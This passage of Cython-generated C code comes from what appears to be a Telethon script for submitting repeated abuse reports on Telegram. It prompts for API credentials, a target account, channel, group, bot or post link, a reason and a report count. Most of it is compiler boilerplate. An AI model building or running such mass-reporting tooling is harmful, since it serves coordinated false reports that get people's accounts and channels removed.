  {&__pyx_n_s_get_valid_input, __pyx_k_get_valid_input, sizeof(__pyx_k_get_valid_input), 0, 0, 1, 1},
  {&__pyx_n_s_get_valid_integer_input, __pyx_k_get_valid_integer_input, sizeof(__pyx_k_get_valid_integer_input), 0, 0, 1, 1},
  {&__pyx_n_u_green, __pyx_k_green, sizeof(__pyx_k_green), 0, 1, 0, 1},
  {&__pyx_n_u_home, __pyx_k_home, sizeof(__pyx_k_home), 0, 1, 0, 1},
  {&__pyx_kp_u_https_t_me, __pyx_k_https_t_me, sizeof(__pyx_k_https_t_me), 0, 1, 0, 0},
  {&__pyx_n_s_i, __pyx_k_i, sizeof(__pyx_k_i), 0, 0, 1, 1},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_n_s_input, __pyx_k_input, sizeof(__pyx_k_input), 0, 0, 1, 1},
  {&__pyx_n_s_input_value, __pyx_k_input_value, sizeof(__pyx_k_input_value), 0, 0, 1, 1},
  {&__pyx_n_s_isdigit, __pyx_k_isdigit, sizeof(__pyx_k_isdigit), 0, 0, 1, 1},
  {&__pyx_n_s_items, __pyx_k_items, sizeof(__pyx_k_items), 0, 0, 1, 1},
  {&__pyx_n_s_keys, __pyx_k_keys, sizeof(__pyx_k_keys), 0, 0, 1, 1},
  {&__pyx_n_s_loop, __pyx_k_loop, sizeof(__pyx_k_loop), 0, 0, 1, 1},
  {&__pyx_n_s_lower, __pyx_k_lower, sizeof(__pyx_k_lower), 0, 0, 1, 1},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_n_u_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 1, 0, 1},
  {&__pyx_n_s_main_2, __pyx_k_main_2, sizeof(__pyx_k_main_2), 0, 0, 1, 1},
  {&__pyx_n_s_message, __pyx_k_message, sizeof(__pyx_k_message), 0, 0, 1, 1},
  {&__pyx_n_s_message_id, __pyx_k_message_id, sizeof(__pyx_k_message_id), 0, 0, 1, 1},
  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
  {&__pyx_n_s_num_reports, __pyx_k_num_reports, sizeof(__pyx_k_num_reports), 0, 0, 1, 1},
  {&__pyx_n_s_number, __pyx_k_number, sizeof(__pyx_k_number), 0, 0, 1, 1},
  {&__pyx_n_s_parts, __pyx_k_parts, sizeof(__pyx_k_parts), 0, 0, 1, 1},
  {&__pyx_n_s_peer, __pyx_k_peer, sizeof(__pyx_k_peer), 0, 0, 1, 1},
  {&__pyx_n_s_phone_number, __pyx_k_phone_number, sizeof(__pyx_k_phone_number), 0, 0, 1, 1},
  {&__pyx_n_s_post_link, __pyx_k_post_link, sizeof(__pyx_k_post_link), 0, 0, 1, 1},
  {&__pyx_n_s_print, __pyx_k_print, sizeof(__pyx_k_print), 0, 0, 1, 1},
  {&__pyx_n_s_prompt, __pyx_k_prompt, sizeof(__pyx_k_prompt), 0, 0, 1, 1},
  {&__pyx_n_s_range, __pyx_k_range, sizeof(__pyx_k_range), 0, 0, 1, 1},
  {&__pyx_n_s_reason, __pyx_k_reason, sizeof(__pyx_k_reason), 0, 0, 1, 1},
  {&__pyx_n_s_reason_choice, __pyx_k_reason_choice, sizeof(__pyx_k_reason_choice), 0, 0, 1, 1},
  {&__pyx_n_s_reason_name, __pyx_k_reason_name, sizeof(__pyx_k_reason_name), 0, 0, 1, 1},
  {&__pyx_n_u_red, __pyx_k_red, sizeof(__pyx_k_red), 0, 1, 0, 1},
  {&__pyx_n_s_replace, __pyx_k_replace, sizeof(__pyx_k_replace), 0, 0, 1, 1},
  {&__pyx_n_s_report_entity, __pyx_k_report_entity, sizeof(__pyx_k_report_entity), 0, 0, 1, 1},
  {&__pyx_n_s_report_reasons, __pyx_k_report_reasons, sizeof(__pyx_k_report_reasons), 0, 0, 1, 1},
  {&__pyx_n_u_report_session, __pyx_k_report_session, sizeof(__pyx_k_report_session), 0, 1, 0, 1},
  {&__pyx_n_s_report_type, __pyx_k_report_type, sizeof(__pyx_k_report_type), 0, 0, 1, 1},
  {&__pyx_n_s_run_until_complete, __pyx_k_run_until_complete, sizeof(__pyx_k_run_until_complete), 0, 0, 1, 1},
  {&__pyx_n_s_send, __pyx_k_send, sizeof(__pyx_k_send), 0, 0, 1, 1},
  {&__pyx_n_s_sleep, __pyx_k_sleep, sizeof(__pyx_k_sleep), 0, 0, 1, 1},
  {&__pyx_n_s_source, __pyx_k_source, sizeof(__pyx_k_source), 0, 0, 1, 1},
  {&__pyx_kp_s_source_py, __pyx_k_source_py, sizeof(__pyx_k_source_py), 0, 0, 1, 0},
  {&__pyx_n_s_split, __pyx_k_split, sizeof(__pyx_k_split), 0, 0, 1, 1},
  {&__pyx_n_s_start, __pyx_k_start, sizeof(__pyx_k_start), 0, 0, 1, 1},
  {&__pyx_n_s_startswith, __pyx_k_startswith, sizeof(__pyx_k_startswith), 0, 0, 1, 1},
  {&__pyx_kp_u_submitted, __pyx_k_submitted, sizeof(__pyx_k_submitted), 0, 1, 0, 0},
  {&__pyx_kp_u_successfully_submitted, __pyx_k_successfully_submitted, sizeof(__pyx_k_successfully_submitted), 0, 1, 0, 0},
  {&__pyx_n_s_sys, __pyx_k_sys, sizeof(__pyx_k_sys), 0, 0, 1, 1},
  {&__pyx_n_s_telethon, __pyx_k_telethon, sizeof(__pyx_k_telethon), 0, 0, 1, 1},
  {&__pyx_n_s_telethon_tl_functions_account, __pyx_k_telethon_tl_functions_account, sizeof(__pyx_k_telethon_tl_functions_account), 0, 0, 1, 1},
  {&__pyx_n_s_telethon_tl_types, __pyx_k_telethon_tl_types, sizeof(__pyx_k_telethon_tl_types), 0, 0, 1, 1},
  {&__pyx_n_s_termcolor, __pyx_k_termcolor, sizeof(__pyx_k_termcolor), 0, 0, 1, 1},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {&__pyx_n_s_throw, __pyx_k_throw, sizeof(__pyx_k_throw), 0, 0, 1, 1},
  {&__pyx_n_s_time, __pyx_k_time, sizeof(__pyx_k_time), 0, 0, 1, 1},
  {&__pyx_n_s_user_input, __pyx_k_user_input, sizeof(__pyx_k_user_input), 0, 0, 1, 1},
  {&__pyx_n_s_valid_options, __pyx_k_valid_options, sizeof(__pyx_k_valid_options), 0, 0, 1, 1},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  __pyx_builtin_input = __Pyx_GetBuiltinName(__pyx_n_s_input); if (!__pyx_builtin_input) __PYX_ERR(0, 21, __pyx_L1_error)
  __pyx_builtin_print = __Pyx_GetBuiltinName(__pyx_n_s_print); if (!__pyx_builtin_print) __PYX_ERR(0, 41, __pyx_L1_error)
  __pyx_builtin_ValueError = __Pyx_GetBuiltinName(__pyx_n_s_ValueError); if (!__pyx_builtin_ValueError) __PYX_ERR(0, 65, __pyx_L1_error)
  __pyx_builtin_range = __Pyx_GetBuiltinName(__pyx_n_s_range); if (!__pyx_builtin_range) __PYX_ERR(0, 152, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  
  __pyx_tuple_ = PyTuple_Pack(2, __pyx_kp_u_Exiting_the_script, __pyx_n_u_red); if (unlikely(!__pyx_tuple_)) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple_);
  __Pyx_GIVEREF(__pyx_tuple_);

  
  __pyx_tuple__3 = PyTuple_Pack(2, __pyx_kp_u_Invalid_input_Please_enter_a_num, __pyx_n_u_red); if (unlikely(!__pyx_tuple__3)) __PYX_ERR(0, 66, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__3);
  __Pyx_GIVEREF(__pyx_tuple__3);

  
  __pyx_tuple__4 = PyTuple_Pack(2, __pyx_kp_u_Invalid_input_Please_enter_a_val, __pyx_n_u_red); if (unlikely(!__pyx_tuple__4)) __PYX_ERR(0, 80, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__4);
  __Pyx_GIVEREF(__pyx_tuple__4);

  
  __pyx_tuple__6 = PyTuple_Pack(2, __pyx_kp_u_1_Account_2_Channel_3_Group_4_Bo, __pyx_n_u_green); if (unlikely(!__pyx_tuple__6)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__6);
  __Pyx_GIVEREF(__pyx_tuple__6);

  
  __pyx_tuple__7 = PyTuple_Pack(1, __pyx_kp_u_What_you_want_to_report); if (unlikely(!__pyx_tuple__7)) __PYX_ERR(0, 89, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__7);
  __Pyx_GIVEREF(__pyx_tuple__7);

  
  __pyx_tuple__8 = PyTuple_Pack(2, __pyx_kp_u_Enter_the_full_post_link_e_g_htt, __pyx_n_u_red); if (unlikely(!__pyx_tuple__8)) __PYX_ERR(0, 101, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__8);
  __Pyx_GIVEREF(__pyx_tuple__8);

  
  __pyx_tuple__9 = PyTuple_Pack(2, __pyx_kp_u_You_can_only_report_a_post_link, __pyx_n_u_red); if (unlikely(!__pyx_tuple__9)) __PYX_ERR(0, 111, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__9);
  __Pyx_GIVEREF(__pyx_tuple__9);

  
  __pyx_tuple__11 = PyTuple_Pack(2, __pyx_kp_u_https_t_me, __pyx_kp_u__10); if (unlikely(!__pyx_tuple__11)) __PYX_ERR(0, 117, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__11);
  __Pyx_GIVEREF(__pyx_tuple__11);

  
  __pyx_tuple__13 = PyTuple_Pack(2, __pyx_kp_u_Invalid_post_link_format_Please, __pyx_n_u_red); if (unlikely(!__pyx_tuple__13)) __PYX_ERR(0, 120, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__13);
  __Pyx_GIVEREF(__pyx_tuple__13);

  
  __pyx_tuple__14 = PyTuple_Pack(2, __pyx_kp_u_Reasons, __pyx_n_u_green); if (unlikely(!__pyx_tuple__14)) __PYX_ERR(0, 130, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__14);
  __Pyx_GIVEREF(__pyx_tuple__14);

  
  __pyx_tuple__16 = PyTuple_Pack(2, __pyx_kp_u_Enter_the_number_for_the_reason, __pyx_n_u_red); if (unlikely(!__pyx_tuple__16)) __PYX_ERR(0, 136, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__16);
  __Pyx_GIVEREF(__pyx_tuple__16);

  
  __pyx_tuple__17 = PyTuple_Pack(2, __pyx_kp_u_How_many_reports_to_submit, __pyx_n_u_red); if (unlikely(!__pyx_tuple__17)) __PYX_ERR(0, 146, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__17);
  __Pyx_GIVEREF(__pyx_tuple__17);

  
  __pyx_tuple__18 = PyTuple_Pack(2, __pyx_kp_u_All_reports_sent_successfully, __pyx_n_u_green); if (unlikely(!__pyx_tuple__18)) __PYX_ERR(0, 161, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__18);
  __Pyx_GIVEREF(__pyx_tuple__18);

  
  __pyx_tuple__20 = PyTuple_Pack(2, __pyx_kp_u_Enter_the_username_or_ID_e_g_use, __pyx_n_u_red); if (unlikely(!__pyx_tuple__20)) __PYX_ERR(0, 169, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__20);
  __Pyx_GIVEREF(__pyx_tuple__20);

  
  __pyx_tuple__22 = PyTuple_Pack(1, __pyx_kp_u_Enter_Api_Id); if (unlikely(!__pyx_tuple__22)) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__22);
  __Pyx_GIVEREF(__pyx_tuple__22);

  
  __pyx_tuple__23 = PyTuple_Pack(1, __pyx_kp_u_Enter_Api_Hash); if (unlikely(!__pyx_tuple__23)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__23);
  __Pyx_GIVEREF(__pyx_tuple__23);

  
  __pyx_tuple__24 = PyTuple_Pack(1, __pyx_kp_u_Enter_Mobile_Number_Eg_9182xx); if (unlikely(!__pyx_tuple__24)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__24);
  __Pyx_GIVEREF(__pyx_tuple__24);

  
  __pyx_tuple__25 = PyTuple_Pack(1, __pyx_n_s_input_value); if (unlikely(!__pyx_tuple__25)) __PYX_ERR(0, 39, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__25);
  __Pyx_GIVEREF(__pyx_tuple__25);
  __pyx_codeobj__26 = (PyObject*)__Pyx_PyCode_New(1, 0, 1, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__25, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_check_exit, 39, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__26)) __PYX_ERR(0, 39, __pyx_L1_error)

  
  __pyx_tuple__27 = PyTuple_Pack(1, __pyx_n_s_input_value); if (unlikely(!__pyx_tuple__27)) __PYX_ERR(0, 45, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__27);
  __Pyx_GIVEREF(__pyx_tuple__27);
  __pyx_codeobj__28 = (PyObject*)__Pyx_PyCode_New(1, 0, 1, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__27, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_check_home, 45, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__28)) __PYX_ERR(0, 45, __pyx_L1_error)

  
  __pyx_tuple__29 = PyTuple_Pack(3, __pyx_n_s_prompt, __pyx_n_s_valid_options, __pyx_n_s_user_input); if (unlikely(!__pyx_tuple__29)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__29);
  __Pyx_GIVEREF(__pyx_tuple__29);
  __pyx_codeobj__30 = (PyObject*)__Pyx_PyCode_New(2, 0, 3, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__29, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_get_valid_input, 49, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__30)) __PYX_ERR(0, 49, __pyx_L1_error)
  __pyx_tuple__31 = PyTuple_Pack(1, ((PyObject *)Py_None)); if (unlikely(!__pyx_tuple__31)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__31);
  __Pyx_GIVEREF(__pyx_tuple__31);

  
  __pyx_tuple__32 = PyTuple_Pack(2, __pyx_n_s_prompt, __pyx_n_s_user_input); if (unlikely(!__pyx_tuple__32)) __PYX_ERR(0, 71, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__32);
  __Pyx_GIVEREF(__pyx_tuple__32);
  __pyx_codeobj__33 = (PyObject*)__Pyx_PyCode_New(1, 0, 2, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__32, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_get_valid_integer_input, 71, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__33)) __PYX_ERR(0, 71, __pyx_L1_error)

  
  __pyx_tuple__35 = PyTuple_Pack(16, __pyx_n_s_client, __pyx_n_s_report_type, __pyx_n_s_post_link, __pyx_n_s_parts, __pyx_n_s_channel_username, __pyx_n_s_message_id, __pyx_n_s_channel, __pyx_n_s_number, __pyx_n_s_reason_name, __pyx_n_s__34, __pyx_n_s_reason_choice, __pyx_n_s_num_reports, __pyx_n_s_i, __pyx_n_s_e, __pyx_n_s_entity_username, __pyx_n_s_entity); if (unlikely(!__pyx_tuple__35)) __PYX_ERR(0, 83, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__35);
  __Pyx_GIVEREF(__pyx_tuple__35);
  __pyx_codeobj__5 = (PyObject*)__Pyx_PyCode_New(1, 0, 16, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__35, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_report_entity, 83, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__5)) __PYX_ERR(0, 83, __pyx_L1_error)

  
  __pyx_tuple__36 = PyTuple_Pack(1, __pyx_n_s_client); if (unlikely(!__pyx_tuple__36)) __PYX_ERR(0, 223, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__36);
  __Pyx_GIVEREF(__pyx_tuple__36);
  __pyx_codeobj__37 = (PyObject*)__Pyx_PyCode_New(0, 0, 1, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__36, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_main_2, 223, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__37)) __PYX_ERR(0, 223, __pyx_L1_error)
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_1 = PyInt_FromLong(1); if (unlikely(!__pyx_int_1)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_2 = PyInt_FromLong(2); if (unlikely(!__pyx_int_2)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_3 = PyInt_FromLong(3); if (unlikely(!__pyx_int_3)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_4 = PyInt_FromLong(4); if (unlikely(!__pyx_int_4)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_5 = PyInt_FromLong(5); if (unlikely(!__pyx_int_5)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_6 = PyInt_FromLong(6); if (unlikely(!__pyx_int_6)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_7 = PyInt_FromLong(7); if (unlikely(!__pyx_int_7)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_8 = PyInt_FromLong(8); if (unlikely(!__pyx_int_8)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_9 = PyInt_FromLong(9); if (unlikely(!__pyx_int_9)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_10 = PyInt_FromLong(10); if (unlikely(!__pyx_int_10)) __PYX_ERR(0, 4, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  if (PyType_Ready(&__pyx_type_6source___pyx_scope_struct__report_entity) < 0) __PYX_ERR(0, 83, __pyx_L1_error)
  #if PY_VERSION_HEX < 0x030800B1
  __pyx_type_6source___pyx_scope_struct__report_entity.tp_print = 0;
  #endif
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_type_6source___pyx_scope_struct__report_entity.tp_dictoffset && __pyx_type_6source___pyx_scope_struct__report_entity.tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_type_6source___pyx_scope_struct__report_entity.tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  __pyx_ptype_6source___pyx_scope_struct__report_entity = &__pyx_type_6source___pyx_scope_struct__report_entity;
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initsource(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC initsource(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_source(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_source(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_source(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'source' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_source(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 4, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Threads initialization code ---*/
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("source", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
